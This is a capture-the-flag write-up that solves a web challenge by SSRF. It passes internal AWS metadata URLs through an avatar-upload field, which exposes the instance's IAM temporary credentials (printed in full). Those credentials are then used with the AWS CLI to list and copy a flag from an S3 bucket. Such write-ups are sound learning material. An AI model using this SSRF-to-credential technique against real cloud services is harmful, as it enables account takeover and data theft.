# Bleeding cloud
Category: Web

## Description
> Part 5 of Imperva's challenge
> 
> Today, many web application are hosted on cloud providers, what can you do?
> 

## Solution

The [previous challenge](Other_bugs.md)'s flag has left us with a hint: `aws_likes_ssrf_image`.

The bug bounty management system offers the ability to change the user's avatar by clicking the "click me" link on the top right corner:

![](images/bug_bounty.png)

The relevant code is:
```html

<!-- ... -->

<img id="imgAvatar" src='' width="200" height="250" alt="Click me"/>

<!-- ... -->

<div id="myModalAvatar" class="modal">

    <!-- Modal content -->
    <div class="modal-content">
        <div class="modal-header">
            <h2>Replace avatar</h2>

            <span class="close">&times;</span>
        </div>
        <div class="modal-body">
            <form id="frmBugReport">
                <div class="form-group row">
                    <label for="txtUrl" class="col-sm-2 col-form-label">Avatar URL</label>
                    <div class="col-sm-8">
                        <input type="text" class="form-control" id="txtUrl" name="txtUrl">
                    </div>
                </div>
                <button class="btn btn-dark" name="btnAvatarUpload">Upload</button><br />
                <span class="help-block" id="bugMessage"></span>

            </form>
        </div>
        <div class="modal-footer justify-content-center">
            <h3 class="text-center"></h3>
        </div>
    </div>

</div>

<!-- ... -->

```

And:

```javascript
// ...

var avatarModal = document.getElementById("myModalAvatar");
var avatar = document.getElementById("imgAvatar");
avatar.onclick = function () {
    avatarModal.style.display = "block";
}

// ...

var json = toJSONString(this);
// console.log(json);
// console.log(JSON.stringify(json));
fetch('/avatarUpload.php', {
    method: 'POST',
    body: JSON.stringify(json),
}).then(function(response) {
    if (response.ok) {
        return response.text();
    }
    return Promise.reject(response);
}).then(function(data) {
    avatar.src = json["txtUrl"];
    $('#bugMessage').text(data["message"]);
    $("#frmBugReport").trigger("reset");
    // console.log(data);
}).catch(function(error) {
    $('#bugMessage').text(error);
    // console.warn(error);
});

```

So the avatar API accepts a URL, not a file. Now, if we provide a URL to a real image, everything works as expected and the avatar changes to the one we've selected. But what if we provide something else?

The clue mentioned AWS and SSRF. [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings) has a nice list of suggestions for [AWS SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-aws-bucket).

The idea here is that we'll provide an internal URL that contains AWS management info, and the server side code will request that URL on our behalf and return us the response. Since the request is being performed from the server side within the internal network, it is permitted. 

The suggestion is to start by trying to retrieve `http://instance-data/latest/meta-data/` (or `http://169.254.169.254/latest/meta-data/hostname` which should point to the same location an uses the AWS internal IP address instead).

```console
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# curl 'http://www.vulnet.zone/avatarUpload.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"category":"Open this select menu","company":"","textareaDetails":"","report":"","txtUrl":"http://instance-data/latest/meta-data/"}'   --compressed   --insecure && echo
{"status":"succeeded","message":"ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping\/\nevents\/\nhibernation\/\nhostname\niam\/\nidentity-credentials\/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics\/\nnetwork\/\nplacement\/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys\/\nreservation-id\nsecurity-groups\nservices\/"}
```

We got a list of available endpoints! For example, we can request the `hostname`:
```console
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# curl 'http://www.vulnet.zone/avatarUpload.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"category":"Open this select menu","company":"","textareaDetails":"","report":"","txtUrl":"http://instance-data/latest/meta-data/hostname"}'   --compressed   --insecure && echo
{"status":"succeeded","message":"ip-172-31-30-9.eu-central-1.compute.internal"}
```

Let's move on to a few more interesting endpoints:
```console
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# curl 'http://www.vulnet.zone/avatarUpload.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"category":"Open this select menu","company":"","textareaDetails":"","report":"","txtUrl":"http://instance-data/latest/meta-data/iam/security-credentials/"}'   --compressed   --insecure && echo
{"status":"succeeded","message":"ctfS3"}

root@kali:/media/sf_CTFs/technion/Bleeding_cloud# curl 'http://www.vulnet.zone/avatarUpload.php'   -H 'Connection: keep-alive'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'   -H 'Content-Type: text/plain;charset=UTF-8'   -H 'Accept: */*'   -H 'Origin: http://www.vulnet.zone'   -H 'Referer: http://www.vulnet.zone/welcome.php'   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8'   -H 'Cookie: cookies_here'   --data-binary '{"category":"Open this select menu","company":"","textareaDetails":"","report":"","txtUrl":"http://instance-data/latest/meta-data/iam/security-credentials/ctfS3"}'   --compressed   --insecure && echo
{"status":"succeeded","message":"{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2020-12-18T17:58:10Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIA4QNOV7PVEKWHIZVT\",\n  \"SecretAccessKey\" : \"BJGGEB536TnXZTuiEoM2+Ym2djQvwprT1u44PyDT\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjEKL\/\/\/\/\/\/\/\/\/\/wEaDGV1LWNlbnRyYWwtMSJHMEUCIQDFlDUEvUa6slxlkKKn8zbLkN\/j1f7lKJdXJ03PQ5T5ZwIgDYlshciO8nyfnmjUfFy4I2+rEuPHBexsvfBo3MlCdgQqugMISxAAGgw4NTk4OTY2NzUzMDYiDFKPV7D\/QmnqFWRYpiqXAypJf6TksPZXImVpIUU0Yj0uJhNN0o\/HcO8hfQ4BXuCvpm1DOiVsH6VXMxgNdpGTWr8CjNpEt\/eYwSk6MAVPOtjg5+lY2qoGJrUuxwhiKe+BquVM17h0giZ18h1B4ozDGkfxA\/vGSJa\/qBznF0yEpLE+fJoesGe4ZpATs8oUN94\/XkrL\/eYzXsW3ZD1ZX66QzmSFHhgTJc24d9bezGjR32fEJD\/dBm9La+7wpc4+jrXCmt6yxHox0gCuGrSagcJfPh9pVYneM81fnD\/S7Kicb1Pw8MiChfqW0hao1twr4wMgp9N3JlYQNK3fZKbMU\/qlvoKTz8D0Joa4elSp4rU4reVUsujCXVE95PDyj4LD3IDXHF5SAd\/23\/M\/IucMRyeWlRE4pCtry68ENpojXr0tdyyVs8XSkgCGgup\/BqDTkBnEBD+V5hOIrHJv5rJ6KpaxEZG0ozUJdaUpCseSSKK4Jn7liqVqF5EzOOXelqTAACcJmILKQHqke8n3imNs72oi8tu1N+oqbFp60K9whtLDm0JZSavpmRDkMODb8\/4FOusBHFYZCuxMUmotN9Dkzp4InT7kJdKZ\/kr61SMhU4hj7vTdjhcRHItO2P+jR7+38kQLDR4O1HR1XkHzLMwDvDwZULeOl6afS1ZpbO8XpePHaaLnEqJeZ8BpnfwBEiylK3HGzGAP7WcAgFlMO9AEqoGnnbUBFcL+IYnZ3JFPy0sGsrH4cOC8Gxy2icQKrGpdIyMqGjb2hZsSc1S4njGpK0AlCEKrAjzpr6SzPSwLnFtAJpztHbgb9Z7D2jdsjugQYdFwi6\/9GKOI\/slKqt5\/vb7dLnSyeAY+jTaoveUZf6D5yM8PCKrvw5\/k+A1XJw==\",\n  \"Expiration\" : \"2020-12-19T00:18:57Z\"\n}"}
```

We got the application's security credentials! We can now use them to view the AWS S3 bucket and search for the flag.

```console
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# export AWS_ACCESS_KEY_ID=ASIA4QNOV7PVEKWHIZVT
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# export AWS_SECRET_ACCESS_KEY=BJGGEB536TnXZTuiEoM2+Ym2djQvwprT1u44PyDT
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEKL//////////wEaDGV1LWNlbnRyYWwtMSJHMEUCIQDFlDUEvUa6slxlkKKn8zbLkN/j1f7lKJdXJ03PQ5T5ZwIgDYlshciO8nyfnmjUfFy4I2+rEuPHBexsvfBo3MlCdgQqugMISxAAGgw4NTk4OTY2NzUzMDYiDFKPV7D/QmnqFWRYpiqXAypJf6TksPZXImVpIUU0Yj0uJhNN0o/HcO8hfQ4BXuCvpm1DOiVsH6VXMxgNdpGTWr8CjNpEt/eYwSk6MAVPOtjg5+lY2qoGJrUuxwhiKe+BquVM17h0giZ18h1B4ozDGkfxA/vGSJa/qBznF0yEpLE+fJoesGe4ZpATs8oUN94/XkrL/eYzXsW3ZD1ZX66QzmSFHhgTJc24d9bezGjR32fEJD/dBm9La+7wpc4+jrXCmt6yxHox0gCuGrSagcJfPh9pVYneM81fnD/S7Kicb1Pw8MiChfqW0hao1twr4wMgp9N3JlYQNK3fZKbMU/qlvoKTz8D0Joa4elSp4rU4reVUsujCXVE95PDyj4LD3IDXHF5SAd/23/M/IucMRyeWlRE4pCtry68ENpojXr0tdyyVs8XSkgCGgup/BqDTkBnEBD+V5hOIrHJv5rJ6KpaxEZG0ozUJdaUpCseSSKK4Jn7liqVqF5EzOOXelqTAACcJmILKQHqke8n3imNs72oi8tu1N+oqbFp60K9whtLDm0JZSavpmRDkMODb8/4FOusBHFYZCuxMUmotN9Dkzp4InT7kJdKZ/kr61SMhU4hj7vTdjhcRHItO2P+jR7+38kQLDR4O1HR1XkHzLMwDvDwZULeOl6afS1ZpbO8XpePHaaLnEqJeZ8BpnfwBEiylK3HGzGAP7WcAgFlMO9AEqoGnnbUBFcL+IYnZ3JFPy0sGsrH4cOC8Gxy2icQKrGpdIyMqGjb2hZsSc1S4njGpK0AlCEKrAjzpr6SzPSwLnFtAJpztHbgb9Z7D2jdsjugQYdFwi6/9GKOI/slKqt5/vb7dLnSyeAY+jTaoveUZf6D5yM8PCKrvw5/k+A1XJw==
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# aws s3 ls --recursive
2020-11-25 12:29:32 1mp32v4c7f
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# aws s3 ls --recursive 1mp32v4c7f
2020-11-26 11:56:56         45 flag5.txt

root@kali:/media/sf_CTFs/technion/Bleeding_cloud# aws s3 cp s3://1mp32v4c7f/flag5.txt .
download: s3://1mp32v4c7f/flag5.txt to ./flag5.txt
root@kali:/media/sf_CTFs/technion/Bleeding_cloud# cat flag5.txt
cstechnion{docx_are_xml_too_flag6_in_passwd}
```

The flag is a hint for the [next challenge](Document_with_secrets.md).